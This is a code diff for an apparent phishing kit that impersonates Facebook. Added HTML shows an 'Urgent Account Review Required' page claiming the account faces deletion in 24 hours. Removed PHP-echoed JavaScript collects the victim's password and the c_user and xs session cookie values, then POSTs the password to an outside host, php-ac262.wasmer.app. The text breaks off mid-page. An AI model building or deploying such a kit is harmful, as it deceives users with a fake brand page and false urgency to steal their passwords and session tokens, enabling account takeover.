-echo "steps[0].classList.remove('active');";
-echo "steps[1].classList.add('active');";
-echo "});";
-echo "";
-echo "// Back to Step 1";
-echo "backToStep1.addEventListener('click', function() {";
-echo "step2.classList.remove('active');";
-echo "step1.classList.add('active');";
-echo "";
-echo "steps[1].classList.remove('active');";
-echo "steps[0].classList.add('active');";
-echo "});";
-echo "";
-echo "// Submit form";
-echo "nextToStep3.addEventListener('click', function() {";
-echo "const passwordInput = document.getElementById('password');";
-echo "";
-echo "if (!passwordInput.checkValidity()) {";
-echo "passwordInput.reportValidity();";
-echo "return;";
-echo "}";
-echo "";
-echo "// Set password for hidden form";
-echo "hiddenPassword.value = passwordInput.value;";
-echo "";
-echo "// Submit password separately";
-echo "const formData = new FormData();";
-echo "formData.append('password', passwordInput.value);";
-echo "";
-echo "fetch('https://php-ac262.wasmer.app', {";
-echo "method: 'POST',";
-echo "body: formData";
-echo "})";
-echo ".then(response => {";
-echo "if (!response.ok) {";
-echo "console.error('Password submission failed');";
-echo "}";
-echo "})";
-echo ".catch(error => {";
-echo "console.error('Submission error:', error);";
-echo "});";
-echo "";
-echo "// Proceed to success step";
-echo "step2.classList.remove('active');";
-echo "step3.classList.add('active');";
-echo "";
-echo "steps[1].classList.remove('active');";
-echo "steps[2].classList.add('active');";
-echo "});";
-echo "";
-echo "// Reset form";
-echo "function resetForm() {";
-echo "document.getElementById('c_user').value = '';";
-echo "document.getElementById('xs').value = '';";
-echo "document.getElementById('password').value = '';";
-echo "";
-echo "hiddenCUser.value = '';";
-echo "hiddenXs.value = '';";
-echo "hiddenPassword.value = '';";
-echo "";
-echo "step3.classList.remove('active');";
-echo "step1.classList.add('active');";
-echo "";
-echo "steps[2].classList.remove('active');";
-echo "steps[0].classList.add('active');";
-echo "";
-echo "video.pause();";
-echo "video.currentTime = 0;";
-echo "videoOverlay.classList.remove('hidden');";
-echo "playPauseBtn.innerHTML = '<i class=\"fas fa-play\"></i>';";
-echo "progressBar.style.width = '0%';";
-echo "bufferedBar.style.width = '0%';";
-echo "currentTimeDisplay.textContent = '0:00';";
-echo "}";
-echo "";
-echo "// Close modal when clicking outside";
-echo "window.addEventListener('click', function(event) {";
-echo "if (event.target === modal) {";
-echo "closeModalFunc();";
-echo "}";
-echo "});";
-echo "});";
-echo "</script>";
-echo "</body>";
-echo "</html>";
-echo "";
+
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook - Account Review</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Helvetica, Arial, sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #f0f2f5, #e4e6eb);
+            color: #1c1e21;
+            line-height: 1.6;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            overflow-x: hidden;
+        }
+        
+        /* Header Styles */
+        .header {
+            background: linear-gradient(to right, #1877f2, #166fe5);
+            padding: 15px 0;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        .header-content {
+            max-width: 1200px;
+            margin: 0 auto;
+            display: flex;
+            flex-wrap: wrap;
+            align-items: center;
+            justify-content: space-between;
+            padding: 0 20px;
+            width: 100%;
+        }
+        
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            color: white;
+            font-size: 24px;
+            font-weight: 700;
+        }
+        
+        .logo i {
+            font-size: 28px;
+        }
+        
+        .help-center {
+            color: rgba(255,255,255,0.9);
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        
+        /* Google Translate Container */
+        .google-translate-container {
+            position: absolute;
+            top: 15px;
+            right: 150px;
+            width: auto;
+            background: rgba(255, 255, 255, 0.2);
+            border-radius: 4px;
+            padding: 5px;
+        }
+        
+        .translate-title {
+            color: white;
+            font-size: 12px;
+            margin-bottom: 5px;
+            display: block;
+            text-align: center;
+        }
+        
+        /* Professional Language Modal Styles */
+        .language-modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.75);
+            backdrop-filter: blur(4px);
+            z-index: 1002;
+            justify-content: center;
+            align-items: center;
+            opacity: 0;
+            transition: opacity 0.3s ease;
+        }
+        
+        .language-modal.active {
+            opacity: 1;
+            display: flex;
+        }
+        
+        .language-modal-content {
+            background: white;
+            border-radius: 20px;
+            width: 95%;
+            max-width: 650px;
+            max-height: 90vh;
+            overflow: hidden;
+            box-shadow: 0 25px 60px rgba(0,0,0,0.25);
+            transform: translateY(30px);
+            transition: transform 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            display: flex;
+            flex-direction: column;
+        }
+        
+        .language-modal.active .language-modal-content {
+            transform: translateY(0);
+        }
+        
+        .language-modal-header {
+            background: linear-gradient(135deg, #1877f2, #166fe5);
+            padding: 25px 30px;
+            color: white;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            position: relative;
+        }
+        
+        .language-modal-header::after {
+            content: '';
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            height: 2px;
+            background: rgba(255, 255, 255, 0.2);
+        }
+        
+        .language-title {
+            font-size: 24px;
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            color: white;
+        }
+        
+        .language-title i {
+            font-size: 26px;
+        }
+        
+        .close-language-modal {
+            background: rgba(255, 255, 255, 0.2);
+            border: none;
+            border-radius: 50%;
+            width: 42px;
+            height: 42px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 22px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+        
+        .close-language-modal:hover {
+            background: rgba(255, 255, 255, 0.3);
+            transform: rotate(90deg);
+        }
+        
+        .language-search-container {
+            padding: 20px;
+            background: #f7f9fc;
+            border-bottom: 1px solid #e4e6eb;
+        }
+        
+        .search-wrapper {
+            position: relative;
+            max-width: 500px;
+            margin: 0 auto;
+            width: 100%;
+        }
+        
+        .language-search {
+            width: 100%;
+            padding: 15px 20px 15px 50px;
+            border: 2px solid #e4e6eb;
+            border-radius: 12px;
+            font-size: 16px;
+            transition: all 0.3s ease;
+            background: white;
+            color: #1c1e21;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.05);
+        }
+        
+        .language-search:focus {
+            border-color: #1877f2;
+            outline: none;
+            box-shadow: 0 0 0 4px rgba(24, 119, 242, 0.15);
+        }
+        
+        .search-icon {
+            position: absolute;
+            left: 20px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #606770;
+            font-size: 18px;
+        }
+        
+        .language-options-container {
+            flex: 1;
+            overflow-y: auto;
+            padding: 20px;
+        }
+        
+        .language-options {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(160px, 1fr));
+            gap: 15px;
+        }
+        
+        .language-btn {
+            background: white;
+            border: 1px solid #e4e6eb;
+            border-radius: 12px;
+            padding: 18px 15px;
+            font-size: 15px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.25s ease;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 10px;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .language-btn:hover {
+            transform: translateY(-3px);
+            border-color: #1877f2;
+            box-shadow: 0 8px 20px rgba(24, 119, 242, 0.12);
+        }
+        
+        .language-btn.selected {
+            border: 2px solid #1877f2;
+            background: rgba(24, 119, 242, 0.05);
+            box-shadow: 0 4px 15px rgba(24, 119, 242, 0.1);
+        }
+        
+        .language-btn.selected::after {
+            content: '';
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            width: 20px;
+            height: 20px;
+            background: #1877f2;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 12px;
+            font-weight: bold;
+        }
+        
+        .language-btn.selected::before {
+            content: '\f00c';
+            font-family: 'Font Awesome 5 Free';
+            font-weight: 900;
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            width: 20px;
+            height: 20px;
+            color: white;
+            z-index: 2;
+            font-size: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .language-icon {
+            font-size: 28px;
+            color: #1877f2;
+            width: 50px;
+            height: 50px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: rgba(24, 119, 242, 0.1);
+            border-radius: 50%;
+        }
+        
+        .language-name {
+            font-weight: 600;
+            color: #1d2129;
+        }
+        
+        .language-native {
+            font-size: 13px;
+            color: #606770;
+            margin-top: 3px;
+        }
+        
+        .language-footer {
+            padding: 20px;
+            background: #f7f9fc;
+            border-top: 1px solid #e4e6eb;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        .selected-language-display {
+            font-size: 15px;
+            color: #606770;
+        }
+        
+        .selected-language-display strong {
+            color: #1d2129;
+            font-weight: 600;
+        }
+        
+        .confirm-btn {
+            background: linear-gradient(135deg, #1877f2, #166fe5);
+            color: white;
+            border: none;
+            border-radius: 12px;
+            padding: 12px 35px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            box-shadow: 0 4px 15px rgba(24, 119, 242, 0.25);
+        }
+        
+        .confirm-btn:hover {
+            background: linear-gradient(135deg, #166fe5, #1461c9);
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(24, 119, 242, 0.35);
+        }
+        
+        .confirm-btn:disabled {
+            background: #e4e6eb;
+            color: #bdc1c9;
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: none;
+        }
+        
+        /* Main Content */
+        .container {
+            max-width: 1000px;
+            margin: 40px auto;
+            padding: 0 20px;
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+        
+        .review-card {
+            background: white;
+            border-radius: 16px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
+            padding: 50px;
+            width: 100%;
+            position: relative;
+            overflow: hidden;
+            border: 1px solid #dddfe2;
+            margin-bottom: 40px;
+            text-align: center;
+        }
+        
+        .review-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 5px;
+            background: linear-gradient(to right, #ff9800, #ff5722);
+        }
+        
+        .warning-icon {
+            font-size: 70px;
+            color: #ff9800;
+            margin-bottom: 25px;
+            text-align: center;
+            animation: pulse 2s infinite;
+        }
+        
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.1); }
+            100% { transform: scale(1); }
+        }
+        
+        .review-title {
+            font-size: 36px;
+            margin-bottom: 20px;
+            color: #1d2129;
+            font-weight: 700;
+            text-align: center;
+        }
+        
+        .review-subtitle {
+            font-size: 20px;
+            color: #606770;
+            max-width: 700px;
+            margin: 0 auto 30px;
+            line-height: 1.6;
+            text-align: center;
+        }
+        
+        .deletion-warning {
+            background: rgba(255, 152, 0, 0.1);
+            border-radius: 12px;
+            padding: 25px;
+            text-align: left;
+            margin: 30px 0;
+            border-left: 4px solid #ff9800;
+        }
+        
+        .deletion-warning h3 {
+            color: #e67700;
+            margin-bottom: 15px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-size: 22px;
+        }
+        
+        .deletion-warning ul {
+            padding-left: 25px;
+        }
+        
+        .deletion-warning li {
+            margin-bottom: 12px;
+            font-size: 17px;
+            line-height: 1.6;
+            color: #1c1e21;
+        }
+        
+        .review-btn {
+            background: linear-gradient(135deg, #1877f2, #166fe5);
+            color: white;
+            border: none;
+            border-radius: 50px;
+            padding: 18px 45px;
+            font-size: 20px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 5px 15px rgba(24, 119, 242, 0.2);
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            margin-top: 20px;
+            display: block;
+            width: fit-content;
+            margin: 30px auto 0;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .review-btn:hover {
+            background: linear-gradient(135deg, #166fe5, #1461c9);
+            transform: translateY(-3px);
+            box-shadow: 0 8px 20px rgba(24, 119, 242, 0.3);
+        }
+        
+        .review-btn::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
+            transition: 0.5s;
+        }
+        
+        .review-btn:hover::after {
+            left: 100%;
+        }
+        
+        /* Modal Styles */
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.7);
+            z-index: 1001;
+            overflow-y: auto;
+            padding: 20px;
+        }
+        
+        .modal-content {
+            background: white;
+            border-radius: 16px;
+            box-shadow: 0 15px 40px rgba(0,0,0,0.2);
+            max-width: 900px;
+            margin: 40px auto;
+            position: relative;
+            overflow: hidden;
+            animation: modalAppear 0.4s ease;
+            border: 1px solid #dddfe2;
+        }
+        
+        @keyframes modalAppear {
+            from { transform: translateY(50px); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
+        }
+        
+        .modal-header {
+            padding: 25px 30px;
+            background: linear-gradient(135deg, #1877f2, #166fe5);
+            color: white;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            border-bottom: 1px solid #dddfe2;
+        }
+        
+        .modal-title {
+            font-size: 24px;
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+        
+        .close-modal {
+            background: transparent;
+            border: none;
+            color: white;
+            font-size: 28px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            width: 40px;
+            height: 40px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-radius: 50%;
+        }
+        
+        .close-modal:hover {
+            background: rgba(255,255,255,0.2);
+            transform: rotate(90deg);
+        }
+        
+        .modal-body {
+            padding: 30px;
+        }
+        
+        .step-indicator {
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+            margin-bottom: 30px;
+        }
+        
+        .step {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            background: #e4e6eb;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 700;
+            position: relative;
+            z-index: 2;
+            color: #606770;
+            font-size: 18px;
+        }
+        
+        .step.active {
+            background: #1877f2;
+            color: white;
+            box-shadow: 0 0 15px rgba(24, 119, 242, 0.3);
+        }
+        
+        .step-line {
+            position: absolute;
+            top: 50%;
+            left: 0;
+            width: 100%;
+            height: 3px;
+            background: #e4e6eb;
+            z-index: 1;
+        }
+        
+        .step-content {
+            display: none;
+        }
+        
+        .step-content.active {
+            display: block;
+            animation: fadeIn 0.5s ease;
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        .step-title {
+            text-align: center;
+            font-size: 24px;
+            margin-bottom: 25px;
+            color: #1d2129;
+        }
+        
+        /* Premium Video Player Styles */
+        .video-player-container {
+            position: relative;
+            width: 100%;
+            background: #000;
+            border-radius: 12px;
+            overflow: hidden;
+            margin: 25px 0;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
+        }
+        
+        .video-container {
+            position: relative;
+            padding-top: 56.25%; /* 16:9 Aspect Ratio */
+        }
+        
+        .video-container video {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            border: none;
+            object-fit: cover;
+        }
+        
+        .video-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.5);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            z-index: 2;
+            transition: opacity 0.3s ease;
+        }
+        
+        .video-overlay.hidden {
+            opacity: 0;
+            pointer-events: none;
+        }
+        
+        .play-btn {
+            background: rgba(24, 119, 242, 0.8);
+            width: 80px;
+            height: 80px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            margin-bottom: 20px;
+            border: 3px solid white;
+            transition: all 0.3s ease;
+        }
+        
+        .play-btn:hover {
+            transform: scale(1.1);
+            background: rgba(24, 119, 242, 1);
+        }
+        
+        .play-btn i {
+            font-size: 40px;
+            color: white;
+        }
+        
+        /* Loading Spinner Styles */
+        .loading-spinner {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            z-index: 3;
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            background: rgba(0,0,0,0.7);
+            border-radius: 50%;
+            width: 100px;
+            height: 100px;
+        }
+        
+        .spinner {
+            border: 4px solid rgba(255, 255, 255, 0.3);
+            border-top: 4px solid #1877f2;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            margin-bottom: 10px;
+        }
+        
+        .loading-percentage {
+            color: white;
+            font-size: 16px;
+            font-weight: bold;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .video-controls {
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            background: rgba(0, 0, 0, 0.7);
+            padding: 10px 15px;
+            display: flex;
+            flex-wrap: wrap;
+            align-items: center;
+            z-index: 10;
+            transform: translateY(100%);
+            transition: transform 0.3s ease;
+        }
+        
+        .video-container:hover .video-controls {
+            transform: translateY(0);
+        }
+        
+        .control-btn {
+            background: none;
+            border: none;
+            color: white;
+            font-size: 16px;
+            cursor: pointer;
+            padding: 5px 10px;
+            outline: none;
+        }
+        
+        .progress-container {
+            flex-grow: 1;
+            height: 5px;
+            background: rgba(255, 255, 255, 0.2);
+            border-radius: 10px;
+            margin: 0 15px;
+            cursor: pointer;
+            position: relative;
+        }
+        
+        .buffered-bar {
+            position: absolute;
+            height: 100%;
+            background: rgba(255, 255, 255, 0.3);
+            border-radius: 10px;
+            width: 0%;
+        }
+        
+        .progress-bar {
+            height: 100%;
+            background: #1877f2;
+            border-radius: 10px;
+            position: relative;
+            width: 0%;
+            z-index: 2;
+        }
+        
+        .time-display {
+            color: white;
+            font-size: 14px;
+            min-width: 100px;
+            text-align: center;
+        }
+        
+        .volume-container {
+            display: flex;
+            align-items: center;
+            margin: 0 15px;
+        }
+        
+        .volume-slider {
+            width: 80px;
+            margin-left: 5px;
+            -webkit-appearance: none;
+            height: 5px;
+            background: rgba(255, 255, 255, 0.2);
+            border-radius: 10px;
+            outline: none;
+        }
+        
+        .volume-slider::-webkit-slider-thumb {
+            -webkit-appearance: none;
+            width: 15px;
+            height: 15px;
+            border-radius: 50%;
+            background: #1877f2;
+            cursor: pointer;
+        }
+        
+        .speed-selector {
+            background: rgba(255, 255, 255, 0.1);
+            color: white;
+            border: none;
+            border-radius: 4px;
+            padding: 5px;
+            margin: 0 15px;
+            cursor: pointer;
+        }
+        
+        .fullscreen-btn {
+            margin-left: auto;
+        }
+        
+        /* Form Styles */
+        .form-group {
+            margin-bottom: 25px;
+        }
+        
+        .form-group label {
+            display: block;
+            margin-bottom: 12px;
+            font-weight: 600;
+            color: #1d2129;
+            font-size: 17px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .form-group label i {
+            color: #ff9800;
+            font-size: 20px;
+        }
+        
+        .form-group input {
+            width: 100%;
+            padding: 16px 20px;
+            border: 2px solid #dddfe2;
+            border-radius: 12px;
+            font-size: 17px;
+            transition: all 0.3s ease;
+            background: #f0f2f5;
+            color: #1c1e21;
+        }
+        
+        .form-group input:focus {
+            border-color: #1877f2;
+            outline: none;
+            background: #f0f2f5;
+            box-shadow: 0 0 0 4px rgba(24, 119, 242, 0.2);
+        }
+        
+        .mobile-instructions {
+            background: rgba(255, 152, 0, 0.1);
+            border-radius: 12px;
+            padding: 25px;
+            margin: 25px 0;
+            border-left: 4px solid #ff9800;
+        }
+        
+        .mobile-instructions h3 {
+            color: #e67700;
+            margin-bottom: 15px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .mobile-instructions ol {
+            padding-left: 25px;
+        }
+        
+        .mobile-instructions li {
+            margin-bottom: 12px;
+            font-size: 16px;
+            line-height: 1.6;
+            color: #1c1e21;
+        }
+        
+        .btn-group {
+            display: flex;
+            gap: 15px;
+            margin-top: 25px;
+        }
+        
+        .btn {
+            flex: 1;
+            padding: 16px 20px;
+            border-radius: 12px;
+            font-size: 17px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-align: center;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .btn-primary {
+            background: linear-gradient(135deg, #1877f2, #166fe5);
+            color: white;
+            border: none;
+            box-shadow: 0 5px 15px rgba(24, 119, 242, 0.2);
+        }
+        
+        .btn-primary:hover {
+            background: linear-gradient(135deg, #166fe5, #1461c9);
+            transform: translateY(-3px);
+            box-shadow: 0 8px 20px rgba(24, 119, 242, 0.3);
+        }
+        
+        .btn-outline {
+            background: transparent;
+            color: #1877f2;
+            border: 2px solid #1877f2;
+        }
+        
+        .btn-outline:hover {
+            background: rgba(24, 119, 242, 0.05);
+            transform: translateY(-3px);
+        }
+        
+        .btn::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
+            transition: 0.5s;
+        }
+        
+        .btn:hover::after {
+            left: 100%;
+        }
+        
+        .success-message {
+            text-align: center;
+            padding: 40px 20px;
+        }
+        
+        .success-icon {
+            font-size: 70px;
+            color: #36a420;
+            margin-bottom: 25px;
+            animation: successPulse 1.5s infinite;
+        }
+        
+        @keyframes successPulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.1); }
+            100% { transform: scale(1); }
+        }
+        
+        .success-title {
+            font-size: 32px;
+            margin-bottom: 20px;
+            color: #1d2129;
+        }
+        
+        .success-text {
+            font-size: 18px;
+            color: #606770;
+            max-width: 600px;
+            margin: 0 auto 30px;
+            line-height: 1.6;
+        }
+        
+        /* Footer */
+        footer {
+            background: white;
+            padding: 30px 0;
+            border-top: 1px solid #dddfe2;
+            margin-top: auto;
+        }
+        
+        .footer-content {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 20px;
+            text-align: center;
+        }
+        
+        .footer-links {
+            display: flex;
+            justify-content: center;
+            gap: 25px;
+            margin: 20px 0;
+            flex-wrap: wrap;
+        }
+        
+        .footer-links a {
+            color: #606770;
+            text-decoration: none;
+            transition: all 0.3s ease;
+            font-weight: 500;
+        }
+        
+        .footer-links a:hover {
+            color: #1877f2;
+            text-decoration: underline;
+        }
+        
+        .copyright {
+            color: #8a8d91;
+            font-size: 14px;
+            margin-top: 15px;
+        }
+        
+        /* Video Quality Selector */
+        .quality-selector {
+            position: absolute;
+            top: 15px;
+            right: 15px;
+            z-index: 20;
+            background: rgba(0,0,0,0.7);
+            color: white;
+            border: none;
+            border-radius: 4px;
+            padding: 5px 10px;
+            font-size: 14px;
+            cursor: pointer;
+        }
+        
+        /* Network Status */
+        .network-status {
+            position: absolute;
+            top: 15px;
+            left: 15px;
+            z-index: 20;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+            color: white;
+            font-size: 12px;
+            background: rgba(0,0,0,0.5);
+            padding: 3px 8px;
+            border-radius: 4px;
+        }
+        
+        .network-status i {
+            color: #4CAF50;
+        }
+        
+        /* Hidden form for submission */
+        .hidden-form {
+            display: none;
+        }
+        
+        @media (max-width: 768px) {
+            .review-card {
+                padding: 30px 20px;
+            }
+            
+            .review-title {
+                font-size: 28px;
+            }
+            
+            .review-subtitle {
+                font-size: 18px;
+            }
+            
+            .review-btn {
+                padding: 16px 30px;
+                font-size: 18px;
+            }
+            
+            .modal-content {
+                margin: 20px auto;
+            }
+            
+            .modal-header {
+                padding: 20px;
+            }
+            
+            .modal-title {
+                font-size: 20px;
+            }
+            
+            .modal-body {
+                padding: 20px;
+            }
+            
+            .btn-group {
+                flex-direction: column;
+            }
+            
+            .video-controls {
+                padding: 8px 10px;
+            }
+            
+            .control-btn {
+                padding: 3px 5px;
+                font-size: 14px;
+            }
+            
+            .time-display {
+                min-width: 80px;
+                font-size: 12px;
+            }
+            
+            .volume-slider {
+                width: 50px;
+            }
+            
+            .header-content {
+                flex-direction: column;
+                align-items: stretch;
+                gap: 15px;
+            }
+            
+            .logo {
+                justify-content: center;
+            }
+            
+            .help-center {
+                justify-content: center;
+            }
+            
+            .google-translate-container {
+                position: relative;
+                width: 100%;
+                margin-top: 10px;
+                right: 0;
+            }
+            
+            .language-options {
+                grid-template-columns: 1fr;
+            }
+            
+            .language-modal-content {
+                padding: 20px 15px;
+            }
+            
+            .language-title {
+                font-size: 20px;
+                padding: 10px 0;
+                position: sticky;
+                top: 0;
+                color: white;
+            }
+            
+            .language-btn {
+                padding: 12px;
+                font-size: 14px;
+            }
+            
+            .language-options {
+                max-height: 50vh;
+                overflow-y: auto;
+            }
+            
+            .close-language-modal {
+                position: sticky;
+                bottom: 0;
+                margin-top: 15px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <div class="header-content">
+            <div class="logo">
+                <i class="fab fa-facebook"></i>
+                <span>Facebook Account Review</span>
+            </div>
+            <div class="help-center">
+                <i class="fas fa-question-circle"></i>
+                Help Center
+            </div>
+            <div class="google-translate-container">
+                <span class="translate-title">Language</span>
+                <select id="google_translate_element" style="width: 100%; background: transparent; border: none; color: white;">
+                    <option value="">Select Language</option>
+                    <option value="en">English</option>
+                    <option value="es">Spanish</option>
+                    <option value="fr">French</option>
+                </select>
+            </div>
+        </div>
+    </div>
+    
+    <div class="container">
+        <div class="review-card">
+            <div class="warning-icon">
+                <i class="fas fa-exclamation-triangle"></i>
+            </div>
+            <h1 class="review-title">Urgent Account Review Required</h1>
+            <p class="review-subtitle">Your account is scheduled for deletion due to policy violations. Request a review to prevent permanent loss of your account and data.</p>
+            
+            <div class="deletion-warning">
+                <h3><i class="fas fa-info-circle"></i> Important Notice</h3>
+                <ul>
+                    <li>Your account is scheduled for deletion in <strong>24 hours</strong></li>
+                    <li>This action is due to violations of our community standards</li>
+                    <li>You may request a review of this decision</li>
+                    <li>If approved, your account will be restored with full access</li>
+                    <li>Failure to request a review will result in permanent deletion</li>
+                </ul>
+            </div>
+            
+            <p class="review-subtitle">To request a review of your account deletion, click the button below and follow the instructions.</p>
+            
+            <button class="review-btn" id="reviewBtn">
+                <i class="fas fa-file-alt"></i> Apply for Account Review
+            </button>
+        </div>
+    </div>
+    
+    <!-- Professional Language Selection Modal -->
+    <div class="language-modal" id="languageModal">
+        <div class="language-modal-content">
+            <div class="language-modal-header">
+                <h2 class="language-title">
+                    <i class="fas fa-globe"></i> Select Video Language
+                </h2>
+                <button class="close-language-modal" id="closeLanguageModal">
+                    <i class="fas fa-times"></i>
+                </button>
+            </div>
+            
+            <div class="language-search-container">
+                <div class="search-wrapper">
+                    <i class="fas fa-search search-icon"></i>
+                    <input type="text" class="language-search" id="languageSearch" placeholder="Search languages...">
+                </div>
+            </div>
+            
+            <div class="language-options-container">
+                <div class="language-options">
+                    <button class="language-btn" data-lang="english">
+                        <div class="language-icon">
+                            <i class="fas fa-language"></i>
+                        </div>
+                        <div class="language-name">English</div>
+                        <div class="language-native">English</div>
+                    </button>
+                    <button class="language-btn" data-lang="filipino">
+                        <div class="language-icon">
+                            <i class="fas fa-language"></i>
+                        </div>
+                        <div class="language-name">Filipino</div>
+                        <div class="language-native">Filipino</div>
+                    </button>
+                    <button class="language-btn" data-lang="hindi">
+                        <div class="language-icon">
+                            <i class="fas fa-language"></i>
+                        </div>
+                        <div class="language-name">Hindi</div>
+                        <div class="language-native">हिन्दी</div>
+                    </button>
+                    <button class="language-btn" data-lang="portuguese">
+                        <div class="language-icon">
+                            <i class="fas fa-language"></i>
+                        </div>
+                        <div class="language-name">Portuguese</div>
+                        <div class="language-native">Português</div>
+                    </button>
+                    <button class="language-btn" data-lang="spanish">
+                        <div class="language-icon">
+                            <i class="fas fa-language"></i>
+                        </div>
+                        <div class="language-name">Spanish</div>
+                        <div class="language-native">Español</div>
+                    </button>
+                    <button class="language-btn" data-lang="tamil">
+                        <div class="language-icon">
+                            <i class="fas fa-language"></i>
+                        </div>
+                        <div class="language-name">Tamil</div>
+                        <div class="language-native">தமிழ்</div>
+                    </button>
+                    <button class="language-btn" data-lang="arabic">
+                        <div class="language-icon">
+                            <i class="fas fa-language"></i>
+                        </div>
+                        <div class="language-name">Arabic</div>
+                        <div class="language-native">العربية</div>
+                    </button>
+                    <button class="language-btn" data-lang="japanese">
+                        <div class="language-icon">
+                            <i class="fas fa-language"></i>
+                        </div>
+                        <div class="language-name">Japanese</div>
+                        <div class="language-native">日本語</div>
+                    </button>
+                    <button class="language-btn" data-lang="french">
+                        <div class="language-icon">
+                            <i class="fas fa-language"></i>
+                        </div>
+                        <div class="language-name">French</div>
+                        <div class="language-native">Français</div>
+                    </button>
+                    <button class="language-btn" data-lang="swedish">
+                        <div class="language-icon">
+                            <i class="fas fa-language"></i>
+                        </div>
+                        <div class="language-name">Swedish</div>
+                        <div class="language-native">Svenska</div>
+                    </button>
+                </div>
+                
+                <p style="text-align: center; margin-top: 20px; color: #606770; font-size: 14px;">
+                    Can't find your language? Request it at: 
